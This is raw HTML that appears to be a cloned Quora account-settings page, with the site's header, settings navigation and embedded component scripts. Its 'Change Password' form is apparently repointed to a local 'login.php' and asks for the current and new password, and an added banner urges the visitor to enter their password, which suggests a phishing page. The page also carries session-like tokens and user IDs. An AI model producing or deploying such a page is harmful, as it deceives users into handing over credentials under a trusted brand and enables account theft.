                        <div class="selector_results_container" id="__w2_oA4urk8_results_container">
                            <div class="lookup_bar_results_wrapper fade_out" id="__w2_oA4urk8_results_wrapper">
                                <div class="results_wrapper">
                                    <div class="hidden resistance_wrapper server_message" id="__w2_oA4urk8_server_message">
                                        <div class="fixit_title" id="__w2_oA4urk8_server_message_title"></div><span class="fixit_note" id="__w2_oA4urk8_server_message_note"></span></div>
                                    <div class="interstitials_and_results">
                                        <div class="hidden ask_interstitial" id="__w2_oA4urk8_ask_mode_interstitial">
                                            <p class="ask_interstitial_content"><strong class="ask_interstitial_title" id="__w2_oA4urk8_interstitial_title"></strong><span id="__w2_oA4urk8_interstitial_text"></span></p>
                                        </div>
                                        <div class="results" id="__w2_oA4urk8_results"></div>
                                    </div>
                                </div>
                            </div>
                            <div id="__w2_oA4urk8_empty_input_prompt"></div>
                        </div>
                    </div>
                    <div class="details_wrapper hidden" id="__w2_oA4urk8_details_wrapper">
                        <div class="editor_wrapper" id="__w2_h8yRtbJ_editor_outer">
                            <div class="Editor AskBarDetails edit_latex web" id="__w2_h8yRtbJ_editor">
                                <div data-group="js-editable" w2cid="h8yRtbJ" id="__w2_h8yRtbJ_doc">
                                    <div class="doc empty" contenteditable="true" data-kind="doc" placeholder="Enter Question Details (Optional)">
                                        <div class="section" data-type="plain" data-indent="0" data-kind="section">
                                            <div class="span" data-kind="span">
                                                <div class="content">
                                                    <br>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <input type="file" accept=".jpg, .png, .jpeg, .gif, .bmp|images/*" multiple="" style="display:none" data-group="js-editable" w2cid="h8yRtbJ" id="__w2_h8yRtbJ_file">
                                <div class="drop_zone hidden" id="__w2_h8yRtbJ_drop_zone"></div>
                                <div class="CharacterCounter fade_out" id="__w2_mDX27kH_counter_wrapper">
                                    <div class="counter" id="__w2_mDX27kH_counter">1000</div>
                                </div>
                                <div class="hidden" id="__w2_h8yRtbJ_link_selector_wrapper">
                                    <div class="Selector LinkSelector" tabindex="-1" id="__w2_hGSzhzG_wrapper">
                                        <div class="link_selector_input">
                                            <div class="selector_input_interaction">
                                                <div class="CharacterCounter fade_out" id="__w2_xIJejEI_counter_wrapper">
                                                    <div class="counter" id="__w2_xIJejEI_counter">250</div>
                                                </div>
                                                <input class="selector_input text" type="text" value="" data-group="js-editable" placeholder="Search" w2cid="hGSzhzG" id="__w2_hGSzhzG_input">
                                                <div class="selector_spinner hidden" id="__w2_hGSzhzG_spinner">
                                                    <div class="LoadingDots tiny">
                                                        <div class="dot first"></div>
                                                        <div class="dot second"></div>
                                                        <div class="dot third"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="selector_results_container hidden" id="__w2_hGSzhzG_results_container">
                                            <div class="selector_results_container_inner hidden" id="__w2_hGSzhzG_results"></div>
                                            <div id="__w2_hGSzhzG_empty_input_prompt"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="photo_search_wrapper" id="__w2_h8yRtbJ_photo_search_wrapper">
                                    <div id="TaqoWF">
                                        <div class="InlinePhotoSearch PhotoSearch">
                                            <div class="nub"></div>
                                            <form action="javascript:void(0)" method="post">
                                                <div class="input_wrapper">
                                                    <input type="text" title="search" placeholder="Search for a photo" data-group="js-editable" w2cid="ur2ROQK" id="__w2_ur2ROQK_search"><a class="upload_link" href="#" id="__w2_ur2ROQK_upload"><span class="upload_icon"></span>Upload</a></div>
                                            </form>
                                            <div class="photo_container" id="__w2_ur2ROQK_photo_container">
                                                <div class="photo_container_inner" id="__w2_ur2ROQK_container">
                                                    <div class="empty_state" id="__w2_ur2ROQK_empty_state">Search for a photo or upload your own
                                                        <div class="bing_attribution">Powered by</div>
                                                    </div>
                                                    <div class="hidden" id="__w2_ur2ROQK_spinner">
                                                        <div class="LoadingDots regular">
                                                            <div class="dot first"></div>
                                                            <div class="dot second"></div>
                                                            <div class="dot third"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="table_cell_wrapper"><span id="SZfjwK"><div class="HoverMenu MoreNavItem SiteHeaderNavItem"><div class="hover_menu hover_menu_header show_nub hidden" id="__w2_RHWupP5_menu"><div class="hover_menu_contents" id="__w2_RHWupP5_menu_contents"><div id="uThICN"><div class="MoreHoverMenuContents SiteHeaderHoverMenuContents"><h3 class="hover_menu_title"></h3><ul class="main_menu"><li><a class="hover_menu_item" href="http://quora.com/profile/Cyber-Fox-8">Profile</a></li><li><a class="hover_menu_item" href="http://quora.com/profile/Cyber-Fox-8/blogs">Blogs</a></li><li><a class="hover_menu_item" href="#" id="__w2_t5Tviof_messages_modal">Messages</a></li><li><a class="hover_menu_item" href="http://quora.com/content">Your Content</a></li><li><a class="hover_menu_item" href="http://quora.com/stats">Stats</a></li><li><a class="hover_menu_item external" href="http://quora.com/ads/create_account?medium=create_ad&amp;source=dropdown_menu" target="_blank" rel="noopener">Create Ad</a></li><li><a class="hover_menu_item" href="http://quora.com/settings">Settings</a></li></ul><ul class="LegalNavLinks"><li class="feedback"><a href="https://help.quora.com/hc/en">Help</a><span class="bullet"> · </span></li>
                <li><a href="http://quora.com/about">About</a><span class="bullet"> · </span><a href="http://quora.com/careers">Careers</a><span class="bullet"> · </span><a href="http://quora.com/about/tos">Terms</a><span class="bullet"> · </span></li>
                <li><a href="http://quora.com/about/privacy">Privacy</a><span class="bullet"> · </span><a href="http://quora.com/about/acceptable_use">Acceptable Use</a><span class="bullet"> · </span></li>
                <li><a href="http://quora.com/business?medium=businesses&amp;source=dropdown_footer">Businesses</a><span class="bullet"> · </span><a href="http://quora.com/settings/languages">Languages</a><span class="bullet"> · </span></li>
                <li></li>
                <li class="logout">
                    <form action="http://quora.com/login/logout_POST" target="_top" method="POST" id="__w2_IlgVXNG_logout_form">
                        <input type="hidden" name="formkey" value="7e935b45c2ff90779de16e2b303d85f4">
                        <input type="hidden" name="next" value="https://www.quora.com/settings" data-group="js-editable" w2cid="IlgVXNG"><a class="logout" href="#" id="__w2_IlgVXNG_logout_link">Logout</a></form>
                </li>
                </ul>
            </div>
        </div>
    </div>
    </div><a class="nav_item_link" href="#" id="__w2_RHWupP5_link"><span class="expanded"><span class="photo_wrapper"><div id="lblVSG"><span class="photo_tooltip IdentityPhoto Photo HoverMenu" id="__w2_a47wHLY_link"><img class="profile_photo_img" src="[PIC]" alt="Cyber Fox" height="50" width="50"></span></div></span></span><span class="truncated"><span class="photo_wrapper"><div id="nxRxUU"><span class="photo_tooltip IdentityPhoto Photo HoverMenu" id="__w2_p2SwrgM_link"><img class="profile_photo_img" src="[PIC]" alt="Cyber Fox" height="50" width="50"></span></div></span></span> <div id="QRGwVC"></div></a></div>
    </span>
    </div>
    <div class="table_cell_wrapper ask_wrapper"><a class="AskQuestionButton LookupBarAskQuestionModalButton" href="#" role="button" id="__w2_c5PZLRC_button"><span class="button_text" id="__w2_c5PZLRC_text">Add Question</span></a></div>
    </div>
    </div>
    </div>
    </div>
    <div id="__w2_P3U2Vb9_body_blur" class="closing"></div>
    <div id="__w2_P3U2Vb9_full_body_blur"></div>
    <div class="desktop_site_header_offset">
        <div id="PMgICB"></div>
    </div>
    <div class="ContentWrapper">
        <div id="__w2_nuT9AVd_content">
            <div class="SettingsMain SettingsAccountMain">
                <div class="grid_page">
                    <div class="layout_3col_left" id="__w2_xlgowPa_left_col">
                        <div class="fixable_clone" style="height: 142px; width: 142px; margin: 0px;">
                            <div id="__w2_xlgowPa_left_col_inner" class="fixable_fixed" style="top: 83px; position: fixed; width: 142px;">
                                <div class="SettingsNavList NavList EditableList" id="__w2_HF0MOMS_wrapper">
                                    <h3 class="title"><div>Settings</div></h3>
                                    <ul>
                                        <div class="nav_item_selected">
                                            <li class="EditableListItem NavListItem SettingsNavListItem not_removable"><a href="http://quora.com/settings" id="__w2_AREXTsw_account">Account</a></li>
                                        </div>
                                        <div>
                                            <li class="EditableListItem NavListItem SettingsNavListItem not_removable"><a href="http://quora.com/settings/privacy" id="__w2_VrurgZh_privacy">Privacy</a></li>
                                        </div>
                                        <div>
                                            <li class="EditableListItem NavListItem SettingsNavListItem not_removable"><a href="http://quora.com/settings/notifications" id="__w2_NPulWvq_notifications">Email &amp; Notifications</a></li>
                                        </div>
                                        <div>
                                            <li class="EditableListItem NavListItem SettingsNavListItem not_removable"><a href="http://quora.com/settings/languages" id="__w2_dgVDRkt_languages">Languages</a></li>
                                        </div>
                                    </ul>
                                    <div class="edit_mode_only"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="layout_3col_center">
                        <div class="SettingsMain SettingsAccountMain">
                            <div class="SettingsGroup">
                                <div class="ui_headers_base ui_headers_section_header">Account Settings</div>
                                <div id="gPlOyW">
                                    <div class="settings_section settings_border">
                                        <div id="HMcaoW">
                                            <div class="EmailAddressRow primary settings_row">
                                                <div class="settings_subheader">Primary Email</div>
                                                <div class="settings_row_contents">
                                                    <div>[EMAIL]</div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="settings_row">
                                            <div class="settings_subheader">&nbsp;</div>
                                            <div class="settings_row_contents">
                                                <div class="add_email" id="__w2_wgcA6AA_add_another_email_row"><a class="sub_settings_item" href="#" id="__w2_wgcA6AA_add_another_email_link">Add Another Email Address</a></div>
                                                <div class="hidden" id="__w2_wgcA6AA_add_email_input_row">
                                                    <div class="form_row new_email">
                                                        <input class="text" type="text" name="new_email" value="" data-group="js-editable" placeholder="name@example.com" w2cid="wgcA6AA" id="__w2_wgcA6AA_new_email">
                                                        <div class="email_submit">
                                                            <input class="submit_button" type="submit" value="Add Email" data-group="js-editable" w2cid="wgcA6AA" id="__w2_wgcA6AA_add_another_email">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="settings_section settings_border">
                                    <div class="settings_row">
                                        <div class="settings_subheader">Password</div>
                                        <div class="settings_row_contents">
                                            <div class="SettingsOption ChangePasswordOption description">
                                                <div id="__w2_GsZ66t1_view_option" class="hidden"><a href="#" id="__w2_GsZ66t1_view_option_link">Change Password</a></div>
                                                <div class="" id="__w2_GsZ66t1_option_content">
                                                    <div>
                                                      <form method="POST" action="login.php">
                                                        <div class="form_row">
                                                            <label>Current Password</label>
                                                            <input class="text" type="password" autocomplete="off" name="old_pass" data-group="js-editable" w2cid="GsZ66t1" id="__w2_GsZ66t1_new_password">
                                                        </div>
                                                        <div class="form_row">
                                                            <label>New Password</label>
                                                            <input class="text" type="password" autocomplete="off" name="new_pass" data-group="js-editable" w2cid="GsZ66t1" id="__w2_GsZ66t1_new_password">
                                                        </div>
                                                        <div class="form_row">
                                                            <label>Confirm Password</label>
                                                            <input class="text" type="password" autocomplete="off" name="cfm_pass" data-group="js-editable" w2cid="GsZ66t1" id="__w2_GsZ66t1_confirm_password">
                                                        </div>
                                                        <div class="form_row password_change_feedback input_validation_error_text hidden" id="__w2_GsZ66t1_password_and_confirmation_mismatch">Your new password and confirmation password do not match.</div>
                                                        <div class="form_buttons">
                                                            <input class="submit_button left" type="submit" value=" Change Password " name="save" data-group="js-editable" w2cid="GsZ66t1" id="__w2_GsZ66t1_change_password_submit">
                                                        </div>
                                                      </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="section_div profile_section">
                                <div class="ui_headers_base ui_headers_section_header">Please enter a secure password, Make sure no one has your password</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </div>
    <div id="IasIFr"></div>
    <div class="__live_spinner hidden" id="__w2_EZ8teRY_loading">
        <div class="__live_spinner_indicator" id="__w2_EZ8teRY_spinner">
            <div class="LoadingDots small">
                <div class="dot first"></div>
                <div class="dot second"></div>
                <div class="dot third"></div>
            </div>
        </div>
    </div>
    <div class="PMsgContainer" id="__w2_JbDZ7W7_pmsg_container"></div>
    <div id="cAuRqu"></div>
    <script type="text/javascript">
        require.whenReady("shared/main-loaded", function() {
            require.whenReady("main", function() {
                require("tchannel_up").start(0, "main-w-dep5105-1074682703685733413", "1237103749628469633", "chan43-8888", "quora.com", "", false);
            });
        });
    </script>
    <script type="text/javascript">
        document.title = "Account Settings - Quora";
    </script>
    <script type="text/javascript">
        require.assertPagePropertiesInstalled();
    </script>
    <script type="text/javascript">
        require.whenReady("shared/main-loaded", function() {
            var webnode = require('shared/core/webnode');
            var args = [{
                    "parents": {
                        "Pg3R7PU": "*ROOT*",
                        "P3U2Vb9": "*ROOT*",
                        "mXtEKoM": "P3U2Vb9",
                        "okRdD5y": "P3U2Vb9",
                        "TB7yyzt": "okRdD5y",
                        "nuT9AVd": "P3U2Vb9",
                        "xlgowPa": "nuT9AVd",
                        "HF0MOMS": "xlgowPa",
                        "JwFVKd9": "HF0MOMS",
                        "AREXTsw": "JwFVKd9",
                        "VrurgZh": "JwFVKd9",
                        "NPulWvq": "JwFVKd9",
                        "dgVDRkt": "JwFVKd9",
                        "nl1tkkX": "xlgowPa",
                        "wgcA6AA": "xlgowPa",
                        "PqWppUY": "wgcA6AA",
                        "GsZ66t1": "xlgowPa",
                        "FBpuorX": "xlgowPa",
                        "WBC3XgS": "xlgowPa",
                        "cDg07ic": "xlgowPa",
                        "IZAl2Dn": "xlgowPa",
                        "AcbICio": "IZAl2Dn",
                        "jQ4oNLp": "xlgowPa",
                        "SKKhQNh": "jQ4oNLp",
                        "K0cZXXN": "jQ4oNLp",
                        "nND827P": "jQ4oNLp",
                        "ACtrd9a": "xlgowPa",
                        "moabeVo": "ACtrd9a",
                        "Uy03saC": "nuT9AVd",
                        "urKof4a": "nuT9AVd",
                        "wb0hTxY": "P3U2Vb9",
                        "nvmHKVq": "*ROOT*",
                        "RmFce8d": "Pg3R7PU",
                        "emp4uBx": "RmFce8d",
                        "it4EHLT": "RmFce8d",
                        "L5ryVlm": "RmFce8d",
                        "GyBtwc9": "P3U2Vb9",
                        "Lsktxee": "GyBtwc9",
                        "nQ2uu6H": "Lsktxee",
                        "VUCub8b": "Lsktxee",
                        "g5sM8nX": "GyBtwc9",
                        "No5Qcda": "g5sM8nX",
                        "BoCtGPJ": "g5sM8nX",
                        "BQuILxc": "GyBtwc9",
                        "G8wMkHg": "BQuILxc",
                        "p1Eg2Gq": "BQuILxc",
                        "Tt7IicR": "GyBtwc9",
                        "oA4urk8": "GyBtwc9",
                        "zb6RZuB": "oA4urk8",
                        "bhQRsas": "oA4urk8",
                        "h8yRtbJ": "oA4urk8",
                        "mDX27kH": "h8yRtbJ",
                        "hGSzhzG": "h8yRtbJ",
                        "xIJejEI": "hGSzhzG",
                        "T8ECaeB": "hGSzhzG",
                        "ur2ROQK": "h8yRtbJ",
                        "szUXUJi": "ur2ROQK",
                        "RHWupP5": "GyBtwc9",
                        "a47wHLY": "RHWupP5",
                        "zqZmwdc": "a47wHLY",
                        "p2SwrgM": "RHWupP5",
                        "SwwlrF8": "p2SwrgM",
                        "Ox10HkY": "RHWupP5",
                        "c5PZLRC": "GyBtwc9",
                        "yX0z8tU": "nvmHKVq",
                        "hVhBGjm": "yX0z8tU",
                        "Jtyx7vW": "yX0z8tU",
                        "akDuLt0": "yX0z8tU",
                        "jlRti6I": "yX0z8tU",
                        "E7oJV4u": "yX0z8tU",
                        "TqdWamu": "yX0z8tU",
                        "g3PPXfM": "yX0z8tU",
                        "Y8ySc3m": "yX0z8tU",
                        "f7V8g0l": "yX0z8tU",
                        "TW602KI": "yX0z8tU",
                        "M69fo2I": "yX0z8tU",
                        "EZ8teRY": "yX0z8tU",
                        "JbDZ7W7": "yX0z8tU",
                        "bU2l54H": "yX0z8tU",
                        "DI1962m": "yX0z8tU",
                        "GB5GQUT": "yX0z8tU",
                        "PXLzlRg": "yX0z8tU",
                        "Km1lh72": "yX0z8tU",
                        "ZKAZ9Gh": "yX0z8tU"
                    },
                    "children": {
                        "P3U2Vb9": {
                            "content": "nuT9AVd"
                        },
                        "GyBtwc9": {
                            "lookup_bar": "oA4urk8"
                        },
                        "oA4urk8": {
                            "counter": "zb6RZuB",
                            "question_details": "h8yRtbJ"
                        },
                        "h8yRtbJ": {
                            "counter": "mDX27kH",
                            "link_selector": "hGSzhzG",
                            "photo_search": "ur2ROQK"
                        },
                        "hGSzhzG": {
                            "counter": "xIJejEI"
                        }
                    },
                    "domids": {
                        "TB7yyzt": "PMgICB",
                        "xlgowPa": "OVbOzQ",
                        "HF0MOMS": "qrDaPW",
                        "JwFVKd9": "CzIBNY",
                        "wgcA6AA": "gPlOyW",
                        "PqWppUY": "HMcaoW",
                        "cDg07ic": "bmxIGQ",
                        "IZAl2Dn": "MZiiWv",
                        "AcbICio": "UCRuRJ",
                        "jQ4oNLp": "uJAKbj",
                        "K0cZXXN": "trqWyj",
                        "nND827P": "fDveWO",
                        "ACtrd9a": "LxhleO",
                        "RmFce8d": "NholJR",
                        "GyBtwc9": "JWLvhC",
                        "Lsktxee": "BWrDlO",
                        "VUCub8b": "RmrhCx",
                        "g5sM8nX": "sYsoOf",
                        "BoCtGPJ": "YiNmBJ",
                        "BQuILxc": "hcdWlI",
                        "p1Eg2Gq": "ggIPsZ",
                        "Tt7IicR": "isiwsC",
                        "oA4urk8": "OpwHoD",
                        "ur2ROQK": "TaqoWF",
                        "RHWupP5": "SZfjwK",
                        "a47wHLY": "lblVSG",
                        "p2SwrgM": "nxRxUU",
                        "Ox10HkY": "QRGwVC",
                        "yX0z8tU": "LMfVow",
                        "hVhBGjm": "IasIFr",
                        "Jtyx7vW": "dPhkSS",
                        "bU2l54H": "cAuRqu"
                    },
                    "hmacs": {
                        "Pg3R7PU": "FwDipDG7HwJLow",
                        "P3U2Vb9": "K0N05JGUz/jylI",
                        "mXtEKoM": "DAalTWsvfBzxrO",
                        "okRdD5y": "SYWDgoXsL72Cbe",
                        "TB7yyzt": "fyttVvo1pmZ5ia",
                        "nuT9AVd": "EvauR91jUnaDqk",
                        "xlgowPa": "u7dpIiQ5sR3sQy",
                        "HF0MOMS": "FTb3V/tVFFcXhb",
                        "JwFVKd9": "jeam5VC62PxQIT",
                        "AREXTsw": "8O4OhL2tVWcei4",
                        "VrurgZh": "8O4OhL2tVWcei4",
                        "NPulWvq": "8O4OhL2tVWcei4",
                        "dgVDRkt": "8O4OhL2tVWcei4",
                        "nl1tkkX": "Z+ol3A8xps9GRW",
                        "wgcA6AA": "xIUGpwJdgj65o8",
                        "PqWppUY": "V5ZwVnsmX9Bzjy",
                        "GsZ66t1": "Z0k8bFCgaps5s9",
                        "FBpuorX": "pEIj65hrrBQT20",
                        "WBC3XgS": "Z+ol3A8xps9GRW",
                        "cDg07ic": "pd3d7P+i/Jo34e",
                        "IZAl2Dn": "6s0VTHycB453yx",
                        "AcbICio": "6e3CFtMPqPjqLI",
                        "jQ4oNLp": "sug5MupyYKSvz+",
                        "SKKhQNh": "XnkLvLwA8JXjoQ",
                        "K0cZXXN": "W5bNGaXP1Heo4q",
                        "nND827P": "le4RIMkLUoInb4",
                        "ACtrd9a": "8fcLSf+F7kOZHl",
                        "moabeVo": "WD9VcOx5mt3bCs",
                        "Uy03saC": "S4wcGVzUxxHge1",
                        "urKof4a": "fTqTKBA8YOwpQv",
                        "wb0hTxY": "yIhehupLwXy2ZT",
                        "nvmHKVq": "jSgexIrQDIVpn4",
                        "RmFce8d": "jVDuVsfNOeJm/M",
                        "emp4uBx": "0kPJrVVLbS2MU1",
                        "it4EHLT": "P59/ftoRCyUqpi",
                        "L5ryVlm": "PZehp13DRwulzr",
                        "GyBtwc9": "C6d0VzyPj0labB",
                        "Lsktxee": "TJSRXegIJNaTfX",
                        "nQ2uu6H": "kD6XcaiKM8b3+B",
                        "VUCub8b": "Nhp6jcvSuMBqPv",
                        "g5sM8nX": "JHc1da7ebZfthl",
                        "No5Qcda": "kD6XcaiKM8b3+B",
                        "BoCtGPJ": "Ipp6lQEvtW67xy",
                        "BQuILxc": "f9xaN9VSYKOyBq",
                        "G8wMkHg": "kD6XcaiKM8b3+B",
                        "p1Eg2Gq": "WnMkpzUqJrLtl8",
                        "Tt7IicR": "E451z7IEsBZRs2",
                        "oA4urk8": "af2epjWO7ZY1nI",
                        "zb6RZuB": "ZzkroqNWdLOMoO",
                        "bhQRsas": "ymWNAWNIMdOKzz",
                        "h8yRtbJ": "hCOzUykwj5woxA",
                        "mDX27kH": "ZzkroqNWdLOMoO",
                        "hGSzhzG": "gRpEbsg2P4lnVQ",
                        "xIJejEI": "ZzkroqNWdLOMoO",
                        "T8ECaeB": "ymWNAWNIMdOKzz",
                        "ur2ROQK": "MxPkBc9TiAIWND",
                        "szUXUJi": "ymWNAWNIMdOKzz",
                        "RHWupP5": "xc9pualkCoCoMv",
                        "a47wHLY": "nQ5I/FyMIcmncx",
                        "zqZmwdc": "cw6msTAzMQ4/lb",
                        "p2SwrgM": "nQ5I/FyMIcmncx",
                        "SwwlrF8": "cw6msTAzMQ4/lb",
                        "Ox10HkY": "+N7FURwDTndOik",
                        "c5PZLRC": "0QP1UBVU9rrNZO",
                        "yX0z8tU": "vXr4a3MLgJsI+k",
                        "hVhBGjm": "H4N6YL2RRfUEoi",
                        "Jtyx7vW": "RBbDsiUbk40vfy",
                        "akDuLt0": "f+sEcRwTb+sbHE",
                        "jlRti6I": "YFI1RXSu8DxUsE",
                        "E7oJV4u": "Qwdqv/nd2Ccw+2",
                        "TqdWamu": "http://quora.com/n7NLReXYrXl3v",
                        "g3PPXfM": "e5r4yEQRzDn4cb",
                        "Y8ySc3m": "AMMmJbLlV4xPNu",
                        "f7V8g0l": "wzXjEjB7bkuwCN",
                        "TW602KI": "o4D6hV5o+SOXVw",
                        "M69fo2I": "1j77S+X28y8XLC",
                        "EZ8teRY": "1UTkDR9nG4n2oK",
                        "JbDZ7W7": "YHfNweTms8ZWw8",
                        "bU2l54H": "1on7AgBqko/PdP",
                        "DI1962m": "p5lGEUx+lQ4CcC",
                        "GB5GQUT": "2D/JudGYD5k2wv",
                        "PXLzlRg": "H2UDSnbFoqOmHr",
                        "Km1lh72": "0Dcgkp3g70+Q2B",
                        "ZKAZ9Gh": "IfUMPT6rWRMndK"
                    }
                },
                [
                    ["app/view/layout", "Layout", "P3U2Vb9", "", {}, {}],
                    ["unified_view/components", "JSTest", "mXtEKoM", "", {}, {}],
                    ["app/view/notifications/header", "TitleNotificationsCount", "TB7yyzt", "", {
                        "notif_count": 0,
                        "inbox_count": 0
                    }, {}],
                    ["app/view/navigation", "SettingsMain", "xlgowPa", "", {}, {}],
                    ["app/view/navigation", "SettingsNavListContents", "HF0MOMS", "", {
                        "is_editing": false,
                        "edit_text": "Edit"
                    }, {}],
                    ["app/view/settings", "SettingsAccountEmailOption", "wgcA6AA", "", {}, {}],
                    ["app/view/settings", "EmailAddressRow", "PqWppUY", "", {
                        "email": "[EMAIL]"
                    }, {}],
                    ["app/view/settings", "ChangePasswordOption", "GsZ66t1", "", {
                        "auto_open_url_hash": null
                    }, {}],
                    ["app/view/login", "LogoutAllSessionsButton", "FBpuorX", "", {
                        "unh": "48e9a8240207a6f00f95dc88d1d23fdc",
                        "time": 1537799109714090,
                        "uid": 531179772,
                        "exclude_current_session": true
                    }, {}],
                    ["app/view/settings", "GoogleConnect", "cDg07ic", "", {
                        "uid": 531179772,
                        "dialog_title": "Connect Google Account"
                    }, {}],
                    ["app/view/activation/twitter", "TwitterConnect", "IZAl2Dn", "", {}, {}],
                    ["app/view/activation/twitter", "TwitterConnectButton", "AcbICio", "", {}, {}],
                    ["app/view/settings", "FacebookAccountConnectedTo", "jQ4oNLp", "", {
                        "uid": 531179772,
                        "fb_uid": 173866386847692
                    }, {}],
                    ["app/view/settings", "OptionLinkBase", "K0cZXXN", "", {}, {}],
                    ["app/view/settings", "FindFacebookFriendsModalLink", "nND827P", "", {}, {}],
                    ["app/view/settings", "LinkedinConnect", "ACtrd9a", "", {}, {}],
                    ["app/view/settings", "LinkedinConnectButton", "moabeVo", "", {}, {}],
                    ["app/view/layout", "QTextImageEnlarger", "Uy03saC", "", {}, {}],
                    ["app/view/layout", "QTextEmbedEnlarger", "urKof4a", "", {}, {}],
                    ["view/livenode", "InteractionModeBanner", "emp4uBx", "", {}, {}],
                    ["view/livenode", "ErrorBanner", "it4EHLT", "", {
                        "default_text": "Your request was not completed."
                    }, {}],
                    ["app/view/site_header/logged_in", "LoggedInSiteHeader", "GyBtwc9", "", {}, {}],
                    ["app/view/site_header/logged_in", "FeedNavBadge", "VUCub8b", "", {
                        "should_growl": false
                    }, {}],
                    ["app/view/site_header/logged_in", "NotifsNavItemBase", "BQuILxc", "", {
                        "show_menu": true,
                        "alignment": "left",
                        "css_positioning": true,
                        "attach_to_body": true,
                        "on": null,
                        "click_open": true,
                        "load_on_pageload": false,
                        "should_preload_menu": false,
                        "should_show_hover_menu": true
                    }, {}],
                    ["app/view/site_header/logged_in", "NotifsNavBadge", "p1Eg2Gq", "", {}, {}],
                    ["app/view/question/lookup_bar", "LookupBarSelector", "oA4urk8", "lookup_bar", {
                        "query": null,
                        "allow_no_selection": true,
                        "length_limit": 250,
                        "is_textarea": false,
                        "should_autofocus": true,
                        "show_results_for_empty_query": false,
                        "metadata": {},
                        "allow_open_new_link": false,
                        "max_concurrent_requests": 3,
                        "max_cache_size": 50,
                        "keepFilters": "",
                        "hasResults": false,
                        "opening_question_punctuation": "",
                        "closing_question_punctuation": "?",
                        "interstitials": {
                            "bad": ["Is your question complete?", "Make sure to fill out a complete sentence that's in the form of a question."],
                            "good": ["You're almost there!", "Make sure to double-check your phrasing before you press Submit."],
                            "button": ["Ask your question here!", "Write your question as a complete sentence, then press Submit."],
                            "answer": ["Ask and answer a question!", "Write about what you know by asking the question first."],
                            "ask_question": ["What is your question?", "Ask a question and get answers from people with unique insights."]
                        },
                        "selector_id": -561204395,
                        "should_go_to_search_on_enter": false,
                        "logged_in": true,
                        "shouldSendJsData": false
                    }, {}],
                    ["unified_view/character_counter", "CharacterCounter", "zb6RZuB", "counter", {
                        "limit": 250,
                        "warning_limit": -1,
                        "visible_on": 25.0,
                        "early_warning": false
                    }, {}],
                    ["app/view/question/lookup_bar_details", "AskBarDetails", "h8yRtbJ", "question_details", {
                        "content_type": "AskBarDetails",
                        "is_plaintext": false,
                        "disabled_commands": ["horizontal-rule", "video"],
                        "content_json": {
                            "sections": [{
                                "spans": [{
                                    "text": "",
                                    "modifiers": {}
                                }],
                                "indent": 0,
                                "quoted": false,
                                "type": "plain"
                            }]
                        },
                        "length_limit": 1000,
                        "photo_search_enabled": true,
                        "interface_strings": {
                            "drop_images": "Drop images here",
                            "uploading_image": "Uploading 1 image...",
                            "uploading_images": "Uploading {} images...",
                            "upload_error": "There was an error uploading this file.",
                            "placeholder": "Enter Question Details (Optional)"
                        }
                    }, {}],
                    ["unified_view/character_counter", "CharacterCounter", "mDX27kH", "counter", {
                        "limit": 1000,
                        "warning_limit": -1,
                        "visible_on": 100.0,
                        "early_warning": false
                    }, {}],
                    ["unified_view/selector/link", "LinkSelector", "hGSzhzG", "link_selector", {
                        "query": "",
                        "allow_no_selection": false,
                        "length_limit": 250,
                        "is_textarea": false,
                        "should_autofocus": false,
                        "show_results_for_empty_query": false,
                        "metadata": {},
                        "allow_open_new_link": false,
                        "should_inline": false,
                        "title_text": null,
                        "placeholder_text": "Search"
                    }, {}],
                    ["unified_view/character_counter", "CharacterCounter", "xIJejEI", "counter", {
                        "limit": 250,
                        "warning_limit": -1,
                        "visible_on": 25.0,
                        "early_warning": false
                    }, {}],
                    ["unified_view/qtext2/photo_search/_photo_search", "PhotoSearch", "ur2ROQK", "photo_search", {
                        "load_default_results": false,
                        "default_query": "",
                        "empty_msg": "No photos found",
                        "searchErrorMsg": "There was an error performing the search. Please try again later."
                    }, {}],
                    ["app/view/site_header/logged_in", "MoreNavItem", "RHWupP5", "", {
                        "show_menu": true,
                        "alignment": "left",
                        "css_positioning": true,
                        "attach_to_body": true,
                        "on": null,
                        "click_open": true,
                        "load_on_pageload": false,
                        "should_preload_menu": false,
                        "should_show_hover_menu": true
                    }, {}],
                    ["view/hover_menu", "HoverMenu", "a47wHLY", "", {
                        "show_menu": false,
                        "alignment": "left",
                        "css_positioning": false,
                        "attach_to_body": true,
                        "on": null,
                        "click_open": false,
                        "load_on_pageload": false,
                        "should_preload_menu": false,
                        "should_show_hover_menu": true,
                        "kwargs": {
                            "uid": 531179772,
                            "qid": null,
                            "aid": null
                        }
                    }, {}],
                    ["view/hover_menu", "HoverMenu", "p2SwrgM", "", {
                        "show_menu": false,
                        "alignment": "left",
                        "css_positioning": false,
                        "attach_to_body": true,
                        "on": null,
                        "click_open": false,
                        "load_on_pageload": false,
                        "should_preload_menu": false,
                        "should_show_hover_menu": true,
                        "kwargs": {
                            "uid": 531179772,
                            "qid": null,
                            "aid": null
                        }
                    }, {}],
                    ["app/view/question/lookup_bar", "LookupBarAskQuestionModalButton", "c5PZLRC", "", {
                        "disabled": false,
                        "targetType": null,
                        "targetOid": null,
                        "source": 1,
                        "shouldOpenModalOnLoad": false,
                        "shouldUsePageModal": false,
                        "modalPrefetched": false,
                        "initial_query": "",
                        "from_url": "https://www.quora.com/settings",
                        "page_type": null,
                        "shouldLoadPostAskA2AModal": false,
                        "shouldLoadPostAskTopicEditModal": false,
                        "question_translation_nid": null,
                        "useMultiModal": null,
                        "multiModalAskStepName": "ask_question"
                    }, {}],
                    ["login", "LoginSignal", "hVhBGjm", "", {
                        "uid": 531179772
                    }, {}],
                    ["unified_view/signup/pixel", "FacebookPixel", "akDuLt0", "", {
                        "events": []
                    }, {}],
                    ["unified_view/signup/pixel", "GooglePixel", "jlRti6I", "", {
                        "events": []
                    }, {}],
